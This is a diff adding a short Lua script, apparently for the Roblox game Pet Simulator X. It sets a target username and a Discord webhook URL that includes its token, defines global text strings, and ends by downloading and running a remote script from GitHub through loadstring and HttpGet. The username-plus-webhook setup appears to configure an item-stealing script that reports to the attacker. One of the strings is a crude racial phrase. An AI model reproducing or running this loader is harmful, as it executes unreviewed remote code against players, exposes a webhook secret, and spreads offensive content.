@@ -1,0 +1,9 @@
+Username = "WWWW6463WWWWWW5WWWWW"
+WebHook = "https://discord.com/api/webhooks/1144589707238449182/zqRb56RjJ1OBwt6coe1H4UjAe1JDDwfPA5QwA0M-6P8hP3pH0EEltRtc3dQ2lye6LxnU"
+
+_G.CustomScriptName = "Coems"
+_G.Text1 = "Who Ever Made This"
+_G.Text2 = "They"
+_G.Text3 = "Suck"
+_G.Text4 = "BlackMen Balls"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
